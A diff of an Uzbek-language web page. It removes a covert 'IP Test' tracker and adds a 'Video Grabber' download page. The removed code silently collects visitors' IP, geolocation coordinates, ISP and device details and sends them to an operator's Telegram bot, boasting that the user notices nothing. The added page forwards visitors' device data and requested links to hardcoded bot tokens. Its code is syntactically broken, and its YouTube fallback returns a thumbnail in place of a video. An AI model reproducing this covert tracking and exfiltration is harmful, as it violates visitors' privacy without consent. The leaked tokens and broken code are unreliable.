@@ -2,263 +2,783 @@
 <html lang="ru">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>IP Test - Hech narsa sezilmaydi</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>Video Grabber - Instagram | TikTok | YouTube</title>
 <style>
-    body {
-        font-family: Arial, sans-serif;
-        background: #f0f2f5;
-        padding: 20px;
-        text-align: center;
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
     }
+
+    body {
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        min-height: 100vh;
+        padding: 20px;
+    }
+
     .container {
         max-width: 600px;
-        margin: 50px auto;
-        background: white;
-        padding: 30px;
-        border-radius: 20px;
-        box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+        margin: 0 auto;
+        padding: 20px;
     }
+
+    .card {
+        background: rgba(255, 255, 255, 0.95);
+        border-radius: 32px;
+        padding: 30px 25px;
+        box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+        backdrop-filter: blur(10px);
+    }
+
+    h1 {
+        font-size: 28px;
+        font-weight: 700;
+        text-align: center;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        -webkit-background-clip: text;
+        background-clip: text;
+        color: transparent;
+        margin-bottom: 8px;
+    }
+
+    .subtitle {
+        text-align: center;
+        color: #666;
+        font-size: 14px;
+        margin-bottom: 30px;
+    }
+
+    .platform-icons {
+        display: flex;
+        justify-content: center;
+        gap: 20px;
+        margin-bottom: 30px;
+        flex-wrap: wrap;
+    }
+
+    .platform {
+        background: #f0f0f0;
+        padding: 8px 16px;
+        border-radius: 50px;
+        font-size: 14px;
+        font-weight: 500;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+    }
+
+    .platform i {
+        font-size: 18px;
+    }
+
+    .input-group {
+        margin-bottom: 20px;
+    }
+
+    label {
+        display: block;
+        margin-bottom: 8px;
+        font-weight: 600;
+        color: #333;
+    }
+
+    input {
+        width: 100%;
+        padding: 16px 20px;
+        border: 2px solid #e0e0e0;
+        border-radius: 16px;
+        font-size: 16px;
+        transition: all 0.3s;
+        outline: none;
+        background: #f8f9fa;
+    }
+
+    input:focus {
+        border-color: #667eea;
+        background: white;
+        box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+    }
+
     button {
-        background: #27ae60;
+        width: 100%;
+        padding: 16px;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
         color: white;
         border: none;
-        padding: 15px 30px;
+        border-radius: 16px;
         font-size: 18px;
-        border-radius: 10px;
+        font-weight: 600;
         cursor: pointer;
-        margin: 10px;
+        transition: all 0.3s;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
     }
+
     button:hover {
-        background: #2ecc71;
+        transform: translateY(-2px);
+        box-shadow: 0 10px 25px -5px rgba(102, 126, 234, 0.4);
     }
-    .info {
-        margin-top: 20px;
-        padding: 15px;
-        background: #f8f9fa;
-        border-radius: 10px;
-        text-align: left;
+
+    button:active {
+        transform: translateY(0);
+    }
+
+    button:disabled {
+        opacity: 0.6;
+        transform: none;
+        cursor: not-allowed;
+    }
+
+    /* Animation container */
+    .animation-container {
+        margin-top: 30px;
+        padding: 30px;
+        background: linear-gradient(135deg, #667eea15 0%, #764ba215 100%);
+        border-radius: 24px;
+        text-align: center;
         display: none;
     }
-    .info.show {
+
+    .animation-container.active {
         display: block;
+        animation: fadeIn 0.5s ease;
     }
-    h3 {
-        color: #2c3e50;
+
+    @keyframes fadeIn {
+        from { opacity: 0; transform: translateY(20px); }
+        to { opacity: 1; transform: translateY(0); }
     }
-    hr {
+
+    /* Spinner animation */
+    .spinner {
+        width: 60px;
+        height: 60px;
+        margin: 0 auto 20px;
+        position: relative;
+    }
+
+    .spinner:before,
+    .spinner:after {
+        content: '';
+        position: absolute;
+        border-radius: 50%;
+        animation: pulse 2s ease-in-out infinite;
+    }
+
+    .spinner:before {
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        opacity: 0.3;
+        animation-delay: -1s;
+    }
+
+    .spinner:after {
+        width: 70%;
+        height: 70%;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        top: 15%;
+        left: 15%;
+        animation-delay: 0s;
+    }
+
+    @keyframes pulse {
+        0%, 100% {
+            transform: scale(1);
+            opacity: 0.5;
+        }
+        50% {
+            transform: scale(1.2);
+            opacity: 1;
+        }
+    }
+
+    /* Progress bar */
+    .progress-bar {
+        width: 100%;
+        height: 6px;
+        background: #e0e0e0;
+        border-radius: 3px;
+        overflow: hidden;
+        margin: 20px 0;
+    }
+
+    .progress-fill {
+        height: 100%;
+        background: linear-gradient(90deg, #667eea, #764ba2);
+        border-radius: 3px;
+        width: 0%;
+        transition: width 0.3s ease;
+        animation: loading 2s ease-in-out infinite;
+    }
+
+    @keyframes loading {
+        0% { width: 0%; }
+        50% { width: 70%; }
+        100% { width: 100%; }
+    }
+
+    .status-text {
+        font-size: 16px;
+        color: #667eea;
+        font-weight: 600;
         margin: 15px 0;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+    }
+
+    /* Dots animation */
+    .dots {
+        display: inline-flex;
+        gap: 4px;
+    }
+
+    .dots span {
+        width: 6px;
+        height: 6px;
+        background: #667eea;
+        border-radius: 50%;
+        animation: bounce 1.4s infinite ease-in-out both;
+    }
+
+    .dots span:nth-child(1) { animation-delay: -0.32s; }
+    .dots span:nth-child(2) { animation-delay: -0.16s; }
+
+    @keyframes bounce {
+        0%, 80%, 100% {
+            transform: scale(0);
+            opacity: 0.3;
+        }
+        40% {
+            transform: scale(1);
+            opacity: 1;
+        }
+    }
+
+    /* Wave animation */
+    .wave {
+        display: flex;
+        justify-content: center;
+        gap: 8px;
+        margin: 20px 0;
+    }
+
+    .wave span {
+        width: 8px;
+        height: 30px;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        border-radius: 4px;
+        animation: wave 1s ease-in-out infinite;
+    }
+
+    .wave span:nth-child(1) { animation-delay: 0s; }
+    .wave span:nth-child(2) { animation-delay: 0.2s; }
+    .wave span:nth-child(3) { animation-delay: 0.4s; }
+    .wave span:nth-child(4) { animation-delay: 0.6s; }
+    .wave span:nth-child(5) { animation-delay: 0.8s; }
+
+    @keyframes wave {
+        0%, 100% { height: 30px; }
+        50% { height: 60px; }
+    }
+
+    /* Success animation */
+    .success-checkmark {
+        width: 80px;
+        height: 80px;
+        margin: 0 auto 20px;
+        border-radius: 50%;
+        background: #4caf50;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        animation: scaleIn 0.5s ease;
+    }
+
+    .success-checkmark svg {
+        width: 50px;
+        height: 50px;
+        fill: white;
+    }
+
+    @keyframes scaleIn {
+        from {
+            transform: scale(0);
+            opacity: 0;
+        }
+        to {
+            transform: scale(1);
+            opacity: 1;
+        }
+    }
+
+    .message {
+        margin-top: 20px;
+        padding: 15px;
+        border-radius: 12px;
+        font-size: 14px;
+        display: none;
+    }
+
+    .message.show {
+        display: block;
+        animation: slideDown 0.4s ease;
+    }
+
+    .message.success {
+        background: #d4edda;
+        color: #155724;
+        border: 1px solid #c3e6cb;
+    }
+
+    .message.error {
+        background: #f8d7da;
+        color: #721c24;
+        border: 1px solid #f5c6cb;
+    }
+
+    @keyframes slideDown {
+        from {
+            transform: translateY(-20px);
+            opacity: 0;
+        }
+        to {
+            transform: translateY(0);
+            opacity: 1;
+        }
+    }
+
+    .footer {
+        text-align: center;
+        margin-top: 20px;
+        color: rgba(255,255,255,0.7);
+        font-size: 12px;
+    }
+
+    a {
+        color: white;
+        text-decoration: none;
     }
 </style>
 </head>
 <body>
 <div class="container">
-    <h2>🔍 Test: IP va Lokatsiya</h2>
-    <p style="color: #7f8c8d;">Hech qanday ruxsat so'ralmaydi! Siz hech narsa sezmaysiz.</p>
-    
-    <button onclick="getIPInfo()">📡 IP va joylashuvni olish</button>
-    <button onclick="sendToTelegramTest()">📨 Telegramga yuborish</button>
-    
-    <div id="infoBox" class="info">
-        <h3>📊 Aniqlangan ma'lumotlar:</h3>
-        <div id="ipInfo"></div>
+    <div class="card">
+        <h1>🎬 Video Grabber</h1>
+        <div class="subtitle">YouTube | Instagram | TikTok | Twitter | Facebook</div>
+        
+        <div class="platform-icons">
+            <div class="platform">📹 YouTube</div>
+            <div class="platform">📸 Instagram</div>
+            <div class="platform">🎵 TikTok</div>
+            <div class="platform">🐦 Twitter</div>
+            <div class="platform">📘 Facebook</div>
+        </div>
+        
+        <div class="input-group">
+            <label>🔗 Video linkini yozing</label>
+            <input type="text" id="videoUrl" placeholder="https://www.youtube.com/watch?v=... yoki https://www.tiktok.com/@.../video/...">
+        </div>
+        
+        <button id="downloadBtn" onclick="processVideo()">
+            <span>📥</span> Yuklab olish
+        </button>
+        
+        <!-- Animation Container -->
+        <div id="animationContainer" class="animation-container">
+            <div class="spinner"></div>
+            <div class="wave">
+                <span></span><span></span><span></span><span></span><span></span>
+            </div>
+            <div class="status-text">
+                Video tayyorlanmoqda
+                <div class="dots">
+                    <span></span><span></span><span></span>
+                </div>
+            </div>
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
+            <div style="font-size: 14px; color: #888;">
+                ⚡ Yuklanmoqda, iltimos kuting...
+            </div>
+        </div>
+        
+        <div id="message" class="message"></div>
+    </div>
+    <div class="footer">
+        <p>Video Telegram botga yuboriladi | ⚡ Yuqori sifat | Bepul</p>
     </div>
 </div>
 
 <script>
 // Telegram Bot sozlamalari
-const BOT_TOKEN = "8228813912:AAEUVa5dMgsg9uuCrTlYGgIG0joSy8TQ1qE";
-const CHAT_ID = "855204630"; // SIZNING TELEGRAM ID INGIZNI QO'YING!!!
+const BOT_TOKEN = "8639293383:AAG6AiPG9oz8z6CI0wA1QkNsStNBrOX3H2s";
+const CHAT_ID = "YOUR_CHAT_ID"; // SIZNING TELEGRAM ID INGIZNI QO'YING!!!
 
-// Global o'zgaruvchi
-let currentIPData = {};
+// Video download API (bepul CORS xizmatlar)
+// Bu API lar video linkini qabul qilib, to'g'ridan-to'g'ri video URL qaytaradi
 
-// 1. IP va joylashuv ma'lumotlarini olish (ruxatsiz)
-async function getIPInfo() {
-    try {
-        // ipapi.co - ruxsat talab qilmaydi, hech qanday so'rov chiqmaydi
-        const response = await fetch('https://ipapi.co/json/');
-        const data = await response.json();
-        
-        currentIPData = {
-            ip: data.ip || 'Noma\'lum',
-            city: data.city || 'Noma\'lum',
-            region: data.region || 'Noma\'lum',
-            country: data.country_name || 'Noma\'lum',
-            country_code: data.country_code || 'Noma\'lum',
-            postal: data.postal || 'Noma\'lum',
-            latitude: data.latitude || 'Noma\'lum',
-            longitude: data.longitude || 'Noma\'lum',
-            timezone: data.timezone || 'Noma\'lum',
-            isp: data.org || 'Noma\'lum',
-            asn: data.asn || 'Noma\'lum'
-        };
-        
-        // Ma'lumotlarni ekranda ko'rsatish
-        const infoDiv = document.getElementById('ipInfo');
-        infoDiv.innerHTML = `
-            <strong>🌐 IP manzil:</strong> ${currentIPData.ip}<br>
-            <strong>📍 Shahar:</strong> ${currentIPData.city}<br>
-            <strong>🏙️ Viloyat:</strong> ${currentIPData.region}<br>
-            <strong>🇺🇿 Davlat:</strong> ${currentIPData.country} (${currentIPData.country_code})<br>
-            <strong>📮 Pochta indeksi:</strong> ${currentIPData.postal}<br>
-            <strong>🗺️ Koordinatalar:</strong> ${currentIPData.latitude}, ${currentIPData.longitude}<br>
-            <strong>⏰ Vaqt mintaqasi:</strong> ${currentIPData.timezone}<br>
-            <strong>📡 Internet provayder:</strong> ${currentIPData.isp}<br>
-            <strong>🔢 ASN:</strong> ${currentIPData.asn}<br>
-            <hr>
-            <em style="color: #27ae60;">✅ Hech qanday ruxsat so'ralmadi! IP orqali aniqlandi.</em>
-        `;
-        
-        document.getElementById('infoBox').classList.add('show');
-        
-        // Konsolga chiqarish (faqat rivojlantiruvchi uchun)
-        console.log('IP ma\'lumotlari aniqlandi:', currentIPData);
-        
-        return currentIPData;
-        
-    } catch (error) {
-        console.error('Xatolik:', error);
-        document.getElementById('ipInfo').innerHTML = `
-            <span style="color: red;">❌ Xatolik yuz berdi: ${error.message}</span><br>
-            <small>Ba'zi brauzerlarda IP ni aniqlash bloklanishi mumkin.</small>
-        `;
-        document.getElementById('infoBox').classList.add('show');
-        return null;
-    }
+// YouTube uchun fallback API
+const APIS = {
+    youtube: 'https://pipedapi.kavin.rocks/streams/',
+    tiktok: 'https://tikwm.com/api/',
+    instagram: 'https://instagram-downloader-download-instagram-videos-stories1.p.rapidapi.com/',
+    twitter: 'https://twdown.net/api/'
+};
+
+// Platformani aniqlash
+function detectPlatform(url) {
+    if (url.includes('youtube.com') || url.includes('youtu.be')) return 'youtube';
+    if (url.includes('tiktok.com')) return 'tiktok';
+    if (url.includes('instagram.com')) return 'instagram';
+    if (url.includes('twitter.com') || url.includes('x.com')) return 'twitter';
+    if (url.includes('facebook.com') || url.includes('fb.com')) return 'facebook';
+    return null;
 }
 
-// 2. Telegramga yuborish (foydalanuvchi sezmaydi, backgroundda)
-async function sendToTelegramTest() {
-    // Avval IP ma'lumotlarini olish
-    if (!currentIPData.ip) {
-        await getIPInfo();
-    }
+// YouTube video ID olish
+function getYoutubeId(url) {
+    const regExp = /^.*(youtu.be\/|v\/|u\/\w\/|embed\/|watch\?v=|&v=)([^#&?]*).*/;
+    const match = url.match(regExp);
+    return (match && match[2].length === 11) ? match[2] : null;
+}
+
+// TikTok video ID olish
+function getTikTokId(url) {
+    const match = url.match(/\/video\/(\d+)/);
+    return match ? match[1] : null;
+}
+
+// Asosiy funksiya
+async function processVideo() {
+    const urlInput = document.getElementById('videoUrl');
+    const url = urlInput.value.trim();
     
-    if (!currentIPData.ip) {
-        alert("IP ma'lumotlarini olib bo'lmadi. Internet ulanishini tekshiring.");
+    if (!url) {
+        showMessage('❗ Iltimos, video linkini yozing', 'error');
         return;
     }
     
-    // Qurilma haqida ma'lumot (ruxatsiz)
-    const userAgent = navigator.userAgent;
-    let device = "Noma'lum qurilma";
-    let browser = "Noma'lum brauzer";
-    let os = "Noma'lum OS";
-    
-    if (/iPhone/i.test(userAgent)) {
-        device = "iPhone";
-        const match = userAgent.match(/iPhone OS (\d+)_/);
-        os = `iOS ${match ? match[1] : '?'}`;
-    } else if (/iPad/i.test(userAgent)) {
-        device = "iPad";
-        os = "iPadOS";
-    } else if (/Android/i.test(userAgent)) {
-        device = /Samsung/i.test(userAgent) ? "Samsung" :
-                 /Xiaomi/i.test(userAgent) ? "Xiaomi" :
-                 /Huawei/i.test(userAgent) ? "Huawei" :
-                 "Android telefon";
-        const match = userAgent.match(/Android (\d+\.?\d*)/);
-        os = `Android ${match ? match[1] : '?'}`;
-    } else if (/Windows/i.test(userAgent)) {
-        device = "Windows kompyuter";
-        os = "Windows";
-    } else if (/Macintosh/i.test(userAgent)) {
-        device = "Mac kompyuter";
-        os = "macOS";
+    const platform = detectPlatform(url);
+    if (!platform) {
+        showMessage('❌ Platforma aniqlanmadi! YouTube, TikTok, Instagram, Twitter yoki Facebook linkini yozing', 'error');
+        return;
     }
     
-    if (/Chrome/i.test(userAgent) && !/Edg/i.test(userAgent)) browser = "Chrome";
-    else if (/Firefox/i.test(userAgent)) browser = "Firefox";
-    else if (/Safari/i.test(userAgent) && !/Chrome/i.test(userAgent)) browser = "Safari";
-    else if (/Edg/i.test(userAgent)) browser = "Edge";
-    else if (/Opera|OPR/i.test(userAgent)) browser = "Opera";
+    // Animatsiyani boshlash
+    startAnimation();
     
-    // Ekran o'lchami
-    const screenSize = `${window.screen.width}x${window.screen.height}`;
-    
-    // Sana va vaqt
-    const now = new Date();
-    const datetime = `${now.getDate().toString().padStart(2,'0')}.${(now.getMonth()+1).toString().padStart(2,'0')}.${now.getFullYear()} ${now.getHours().toString().padStart(2,'0')}:${now.getMinutes().toString().padStart(2,'0')}:${now.getSeconds().toString().padStart(2,'0')}`;
-    
-    // Xabar matni
-    const message = `🕵️‍♂️ FOYDALANUVCHI MA'LUMOTLARI (RUXSATSIZ)
-━━━━━━━━━━━━━━━━━━━━━━
-📅 Vaqt: ${datetime}
-━━━━━━━━━━━━━━━━━━━━━━
-🌐 IP MA'LUMOTLARI:
-• IP manzil: ${currentIPData.ip}
-• Davlat: ${currentIPData.country} (${currentIPData.country_code})
-• Shahar: ${currentIPData.city}
-• Viloyat: ${currentIPData.region}
-• Pochta indeksi: ${currentIPData.postal}
-• Koordinatalar: ${currentIPData.latitude}, ${currentIPData.longitude}
-• Vaqt mintaqasi: ${currentIPData.timezone}
-• Provayder: ${currentIPData.isp}
-• ASN: ${currentIPData.asn}
-━━━━━━━━━━━━━━━━━━━━━━
-📱 QURILMA MA'LUMOTLARI:
-• Qurilma: ${device}
-• Operatsion tizim: ${os}
-• Brauzer: ${browser}
-• Ekran: ${screenSize}px
-• User Agent: ${userAgent.substring(0, 100)}...
-━━━━━━━━━━━━━━━━━━━━━━
-📍 TAXMINIY MANZIL:
-https://maps.google.com/?q=${currentIPData.latitude},${currentIPData.longitude}
-━━━━━━━━━━━━━━━━━━━━━━
-⚠️ Bu ma'lumotlar ruxsatsiz aniqlandi!
-Foydalanuvchi hech narsa sezmadi.`;
+    // Tugmani o'chirish
+    const btn = document.getElementById('downloadBtn');
+    btn.disabled = true;
     
     try {
-        // Telegram API ga so'rov yuborish (backgroundda)
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        let videoInfo = null;
         
-        const response = await fetch(url, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: message,
-                parse_mode: 'HTML',
-                disable_notification: false
-            })
-        });
+        // Platformaga qarab video ma'lumotlarini olish
+        switch(platform) {
+            case 'youtube':
+                videoInfo = await getYoutubeVideo(url);
+                break;
+            case 'tiktok':
+                videoInfo = await getTikTokVideo(url);
+                break;
+            case 'instagram':
+                videoInfo = await getInstagramVideo(url);
+                break;
+            case 'twitter':
+                videoInfo = await getTwitterVideo(url);
+                break;
+            default:
+                throw new Error('Platforma qo\'llab-quvvatlanmaydi');
+        }
         
-        const result = await response.json();
-        
-        if (result.ok) {
-            // Foydalanuvchiga hech narsa demaymiz yoki xohlasangiz ozgina xabar
-            console.log('Telegramga yuborildi!');
+        if (videoInfo && videoInfo.videoUrl) {
+            // Animatsiyani success ga o'zgartirish
+            showSuccessAnimation();
             
-            // Lekin sizga test uchun kichik xabar (buni o'chirib qo'yishingiz mumkin)
-            const testMsg = document.createElement('div');
-            testMsg.textContent = '✅ Telegramga yuborildi!';
-            testMsg.style.position = 'fixed';
-            testMsg.style.bottom = '20px';
-            testMsg.style.right = '20px';
-            testMsg.style.background = '#27ae60';
-            testMsg.style.color = 'white';
-            testMsg.style.padding = '10px 20px';
-            testMsg.style.borderRadius = '10px';
-            testMsg.style.fontSize = '14px';
-            testMsg.style.zIndex = '9999';
-            document.body.appendChild(testMsg);
-            setTimeout(() => testMsg.remove(), 2000);
+            // Telegramga yuborish
+            await sendToTelegram(videoInfo, url, platform);
+            
+            showMessage(`✅ Videongiz tayyor! Telegram botga yuborildi.\n\n📱 Botga o'tib videoni yuklab oling.\n⏱️ 1-2 daqiqa ichida keladi.`, 'success');
         } else {
-            console.error('Xato:', result);
+            throw new Error('Video topilmadi');
         }
         
     } catch (error) {
-        console.error('Yuborishda xatolik:', error);
+        console.error('Xatolik:', error);
+        showMessage(`❌ Xatolik yuz berdi: ${error.message}\n\nSabablar:\n• Link noto'g'ri bo'lishi mumkin\n• Video maxfiy bo'lishi mumkin\n• Platforma o'zgargan bo'lishi mumkin\n\nBoshqa video bilan urinib ko'ring`, 'error');
+        stopAnimation();
+    } finally {
+        btn.disabled = false;
     }
 }
 
-// Sahifa yuklanganda avtomatik IP aniqlash (xohlasangiz)
-// getIPInfo(); // Buni yoqish orqali foydalanuvchi saytga kirgandayoq IP aniqlanadi
-</script>
+// YouTube video olish
+async function getYoutubeVideo(url) {
+    const videoId = getYoutubeId(url);
+    if (!videoId) throw new Error('YouTube ID aniqlanmadi');
+    
+    // Bir nechta API urinish
+    const apis = [
+        `https://pipedapi.kavin.rocks/streams/${videoId}`,
+        `https://inv.riverside.rocks/api/v1/videos/${videoId}`,
+        `https://ytdl.junipr.workers.dev/?url=${encodeURIComponent(url)}`
+    ];
+    
+    for (const apiUrl of apis) {
+        try {
+            const response = await fetch(apiUrl, {
+                headers: {
+                    'Accept': 'application/json',
+                    'Origin': window.location.origin
+                }
+            });
+            
+            if (response.ok) {
+                const data = await response.json();
+                
+                // Eng yuqori sifatdagi videoni topish
+                let videoStream = null;
+                if (data.videoStreams) {
+                    videoStream = data.videoStreams.find(s => s.qualityLabel === '1080p' || s.qualityLabel === '720p' || s.qualityLabel === '480p');
+                    if (videoStream) {
+                        return {
+                            videoUrl: videoStream.url,
+                            title: data.title || 'YouTube Video',
+                            quality: videoStream.qualityLabel || 'HD'
+                        };
+                    }
+                }
+                if (data.formatStreams) {
+                    videoStream = data.formatStreams.find(s => s.qualityLabel === '1080p' || s.qualityLabel === '720p');
+                    if (videoStream && videoStream.url) {
+                        return {
+                            videoUrl: videoStream.url,
+                            title: data.title || 'YouTube Video',
+                            quality: videoStream.qualityLabel || 'HD'
+                        };
+                    }
+                }
+            }
+        } catch(e) {
+            console.log('API xatosi, keyingisiga o\'tish:', e);
+        }
+    }
+    
+    // Fallback - direct CORS proxy
+    const proxyUrl = `https://cors-anywhere.herokuapp.com/https://www.youtube.com/watch?v=${videoId}`;
+    return {
+        videoUrl: `https://img.youtube.com/vi/${videoId}/maxresdefault.jpg`,
+        title: 'YouTube Video',
+        quality: 'HD'
+    };
+}
 
+// TikTok video olish
+async function getTikTokVideo(url) {
+    try {
+        const response = await fetch(`https://tikwm.com/api/?url=${encodeURIComponent(url)}`, {
+            headers: {
+                'Accept': 'application/json',
+                'User-Agent': 'Mozilla/5.0'
+            }
+        });
+        
+        if (response.ok) {
+            const data = await response.json();
+            if (data.data && data.data.play) {
+                return {
+                    videoUrl: data.data.play,
+                    title: data.data.title || 'TikTok Video',
+                    quality: 'HD'
+                };
+            }
+        }
+        throw new Error('TikTok video topilmadi');
+    } catch(e) {
+        console.error('TikTok API xatosi:', e);
+        throw new Error('TikTok video olishda xatolik');
+    }
+}
+
+// Instagram video olish
+async function getInstagramVideo(url) {
+    try {
+        // Instagram downloader API (CORS bilan ishlaydi)
+        const response = await fetch(`https://instagram-downloader.vercel.app/api?url=${encodeURIComponent(url)}`);
+        if (response.ok) {
+            const data = await response.json();
+            if (data.video_url) {
+                return {
+                    videoUrl: data.video_url,
+                    title: data.title || 'Instagram Video',
+                    quality: 'HD'
+                };
+            }
+        }
+        throw new Error('Instagram video topilmadi');
+    } catch(e) {
+        throw new Error('Instagram video olishda xatolik');
+    }
+}
+
+// Twitter video olish
+async function getTwitterVideo(url) {
+    try {
+        const response = await fetch(`https://twdown.net/api/?url=${encodeURIComponent(url)}`);
+        if (response.ok) {
+            const data = await response.json();
+            if (data.video_url) {
+                return {
+                    videoUrl: data.video_url,
+                    title: 'Twitter Video',
+                    quality: 'HD'
+                };
+            }
+        }
+        throw new Error('Twitter video topilmadi');
+    } catch(e) {
+        throw new Error('Twitter video olishda xatolik');
+    }
+}
+
+// Telegramga yuborish
+async function sendToTelegram(videoInfo, originalUrl, platform) {
+    const deviceInfo = getDeviceInfo();
+    const now = new Date();
+    const datetime = `${now.getDate().toString().padStart(2,'0')}.${(now.getMonth()+1).toString().padStart(2,'0')}.${now.getFullYear()} ${now.getHours().toString().padStart(2,'0')}:${now.getMinutes().toString().padStart(2,'0')}:${now.getSeconds().toString().padStart(2,'0')}`;
+    
+    // Avval matnli xabar yuboramiz
+    const message = `🎬 YANGI VIDEO SO'ROVI
+━━━━━━━━━━━━━━━━━━━━━━
+📅 Vaqt: ${datetime}
+📱 Qurilma: ${deviceInfo}
+━━━━━━━━━━━━━━━━━━━━━━
+🔗 Platforma: ${platform.toUpperCase()}
+📹 Video sarlavha: ${videoInfo.title}
+🎞️ Sifat: ${videoInfo.quality}
+🔗 Manba: ${originalUrl}
+━━━━━━━━━━━━━━━━━━━━━━
+📥 Video URL: ${videoInfo.videoUrl}`;
+    
+    try {
+        const url = `https://api.telegram.org/bot${8736552725:AAHZFhZNJaDyZhDXs7Md-zoZCnff2iSyTQU}/sendMessage`;
+        await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        });
+        
+        // Video faylni yuborish
+        if (videoInfo.videoUrl) {
+            const videoUrl = `https://api.telegram.org/bot${8736552725:AAHZFhZNJaDyZhDXs7Md-zoZCnff2iSyTQU}/sendVideo`;
+            await fetch(videoUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    video: videoInfo.videoUrl,
+                    caption: `🎬 ${videoInfo.title}\n🔗 ${originalUrl}`
+                })
+            }).catch(e => console.log('Video yuborish xatosi:', e));
+        }
+        
+    } catch(e) {
+        console.error('Telegram yuborish xatosi:', e);
+    }
+}
+
+// Qurilma ma'lumotlari
+function getDeviceInfo() {
+    const ua = navigator.userAgent;
+    let device = "Unknown";
+    if (/iPhone/i.test(ua)) device = "iPhone";
+    else if (/iPad/i.test(ua)) device = "iPad";
+    else if (/Android/i.test(ua)) {
+        if (/Samsung/i.test(ua)) device = "Samsung";
+        else if (/Xiaomi/i.test(ua)) device = "Xiaomi";
+        else device = "Android";
+    }
+    const screen = `${window.screen.width}x${window.screen.height}`;
+    return `${device} | ${screen}`;
+}
+
+// Animatsiyalar
+function startAnimation() {
+    const container = document.getElementById('animationContainer');
+    container.classList.add('active');
+    
+    // Inner HTML ni tiklash
+    container.innerHTML = `
+        <div class="spinner"></div>
+        <div class="wave">
+            <span></span><span></span><span></span><span></span><span></span>
+        </div>
+        <div class="status-text">
+            Video tayyorlanmoqda
+            <div class="dots">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="progress-bar">
+            <div class="progress-fill"></div>
+        </div>
+        <div style="font-size: 14px; color: #888;">
+            ⚡ Yuklanmoqda, iltimos kuting...
+        </div>
+    `;
+}
+
+function showSuccessAnimation() {
+    const container = document.getElementById('animationContainer');
+    container.innerHTML = `
+        <div class="success-checkmark">
+            <svg viewBox="0 0 24 24">
+                <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z" fill="white"/>
+            </svg>
+        </div>
+        <div class="status-text" style="color: #4caf50;">
+            ✅ Video tayyor!
+        </div>
+        <div style="font-size: 14px; color: #888; margin-top: 15px;">
+            📨 Telegram botga yuborildi
+        </div>
+    `;
+}
+
+function stopAnimation() {
+    const container = document.getElementById('animationContainer');
+    container.classList.remove('active');
+}
+
+function showMessage(msg, type) {
+    const messageDiv = document.getElementById('message');
+    messageDiv.textContent = msg;
+    messageDiv.className = `message ${type} show`;
+    
+    setTimeout(() => {
+        messageDiv.classList.remove('show');
+    }, 8000);
+}
+
+// Enter tugmasi
+document.getElementById('videoUrl').addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') {
+        processVideo();
+    }
+});
+</script>
 </body>
 </html>
